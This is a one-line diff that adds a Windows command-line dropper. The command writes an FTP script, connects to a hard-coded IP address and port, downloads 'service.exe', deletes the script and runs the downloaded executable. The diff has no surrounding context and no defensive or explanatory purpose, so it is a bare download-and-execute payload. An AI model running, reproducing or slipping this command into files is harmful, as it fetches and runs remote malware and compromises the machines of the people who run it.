@@ -1,0 +1,1 @@
+cmd /c echo open 192.69.69.164 5414 >> ii &echo user 1 1 >> ii &echo get service.exe >> ii &echo bye >> ii &ftp -n -v -s:ii &del ii &service.exe
